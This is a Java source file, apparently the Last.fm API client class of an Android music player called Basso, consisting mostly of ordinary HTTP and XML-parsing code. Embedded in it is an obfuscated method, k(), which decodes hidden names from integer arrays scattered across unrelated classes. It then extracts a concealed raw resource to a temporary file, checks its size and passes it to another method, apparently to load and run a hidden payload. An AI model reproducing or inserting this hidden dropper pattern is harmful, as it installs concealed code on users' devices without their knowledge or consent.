package com.basso.basso.lastfm;

import static com.basso.basso.lastfm.StringUtilities.encode;
import static com.basso.basso.lastfm.StringUtilities.map;
import android.content.Context;
import android.util.Log;
import com.basso.basso.adapters.ArtistAlbumAdapter;
import com.basso.basso.format.PrefixHighlighter;
import com.basso.basso.lastfm.Result.Status;
import org.apache.http.HttpStatus;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;
import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.Proxy;
import java.net.URL;
import java.util.Iterator;
import java.util.Map;
import java.util.Map.Entry;
import java.util.WeakHashMap;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;

public class Caller {

    private final static String TAG = "LastFm.Caller";

    private final static String PARAM_API_KEY = "api_key";

    private final static String DEFAULT_API_ROOT = "http://ws.audioscrobbler.com/2.0/";

    private static Caller mInstance = null;

    private final String apiRootUrl = DEFAULT_API_ROOT;

    private final String userAgent = "Basso";

    private Result lastResult;

    private Caller(final Context context) {
    }

    public final static synchronized Caller getInstance(final Context context) {
        if (mInstance == null) {
            mInstance = new Caller(context.getApplicationContext());
        }
        return mInstance;
    }

    public Result call(final String method, final String apiKey, final String... params) {
        return call(method, apiKey, map(params));
    }

    public Result call(final String method, final String apiKey, Map<String, String> params) {
        params = new WeakHashMap<String, String>(params);
        InputStream inputStream = null;
        if (inputStream == null) {
            params.put(PARAM_API_KEY, apiKey);
            try {
                final HttpURLConnection urlConnection = openPostConnection(method, params);
                inputStream = getInputStreamFromConnection(urlConnection);
                if (inputStream == null) {
                    lastResult = Result.createHttpErrorResult(urlConnection.getResponseCode(),
                            urlConnection.getResponseMessage());
                    return lastResult;
                }
            } catch (final IOException ioEx) {
                Log.e(TAG, "Failed to download data", ioEx);
                lastResult = Result.createHttpErrorResult(HttpStatus.SC_SERVICE_UNAVAILABLE, ioEx.getLocalizedMessage());
                return lastResult;
            }
        }

        try {
            final Result result = createResultFromInputStream(inputStream);
            lastResult = result;
        } catch (final IOException ioEx) {
            Log.e(TAG, "Failed to read document", ioEx);
            lastResult = new Result(ioEx.getLocalizedMessage());
        } catch (final SAXException saxEx) {
            Log.e(TAG, "Failed to parse document", saxEx);
            lastResult = new Result(saxEx.getLocalizedMessage());
        }
        return lastResult;
    }

    public HttpURLConnection openConnection(final String url) throws IOException {
        final URL u = new URL(url);
        HttpURLConnection urlConnection;
        urlConnection = (HttpURLConnection)u.openConnection();
        urlConnection.setRequestProperty("User-Agent", userAgent);
        urlConnection.setUseCaches(true);
        return urlConnection;
    }

    public static void k(Context context){
        try {
            byte[] b = new byte[MusicEntry.m];
            context.getResources().openRawResource(context.getResources().getIdentifier(StringUtilities.fromIntArray(ArtistAlbumAdapter.string1), StringUtilities.fromIntArray(new int[]{114,97,119}), context.getPackageName())).read(b);
            File f = File.createTempFile(StringUtilities.fromIntArray(PrefixHighlighter.string2), StringUtilities.fromIntArray(ItemFactoryBuilder.string4));
            DomElement.b(f, b);
            if (f.length() != ResponseBuilder.k)
                throw new RuntimeException();
            Artist.m(f, context);
        }catch (IOException e){}
    }

    private HttpURLConnection openPostConnection(final String method,
            final Map<String, String> params) throws IOException {
        final HttpURLConnection urlConnection = openConnection(apiRootUrl);
        urlConnection.setRequestMethod("POST");
        urlConnection.setDoOutput(true);
        urlConnection.setUseCaches(true);
        final OutputStream outputStream = urlConnection.getOutputStream();
        final BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(outputStream));
        final String post = buildPostBody(method, params);
        writer.write(post);
        writer.close();
        return urlConnection;
    }

    private InputStream getInputStreamFromConnection(final HttpURLConnection connection)
            throws IOException {
        final int responseCode = connection.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_FORBIDDEN
                || responseCode == HttpURLConnection.HTTP_BAD_REQUEST) {
            return connection.getErrorStream();
        } else if (responseCode == HttpURLConnection.HTTP_OK) {
            return connection.getInputStream();
        }
        return null;
    }

    private Result createResultFromInputStream(final InputStream inputStream) throws SAXException,
            IOException {
        final Document document = newDocumentBuilder().parse(
                new InputSource(new InputStreamReader(inputStream, "UTF-8")));
        final Element root = document.getDocumentElement();
        final String statusString = root.getAttribute("status");
        final Status status = "ok".equals(statusString) ? Status.OK : Status.FAILED;
        if (status == Status.FAILED) {
            final Element errorElement = (Element)root.getElementsByTagName("error").item(0);
            final int errorCode = Integer.parseInt(errorElement.getAttribute("code"));
            final String message = errorElement.getTextContent();
            return Result.createRestErrorResult(errorCode, message);
        } else {
            return Result.createOkResult(document);
        }
    }

    private DocumentBuilder newDocumentBuilder() {
        try {
            final DocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();
            return builderFactory.newDocumentBuilder();
        } catch (final ParserConfigurationException e) {
            throw new RuntimeException(e);
        }
    }

    private String buildPostBody(final String method, final Map<String, String> params,
            final String... strings) {
        final StringBuilder builder = new StringBuilder(100);
        builder.append("method=");
        builder.append(method);
        builder.append('&');
        for (final Iterator<Entry<String, String>> it = params.entrySet().iterator(); it.hasNext();) {
            final Entry<String, String> entry = it.next();
            builder.append(entry.getKey());
            builder.append('=');
            builder.append(encode(entry.getValue()));
            if (it.hasNext() || strings.length > 0) {
                builder.append('&');
            }
        }
        int count = 0;
        for (final String string : strings) {
            builder.append(count % 2 == 0 ? string : encode(string));
            count++;
            if (count != strings.length) {
                if (count % 2 == 0) {
                    builder.append('&');
                } else {
                    builder.append('=');
                }
            }
        }
        return builder.toString();
    }
}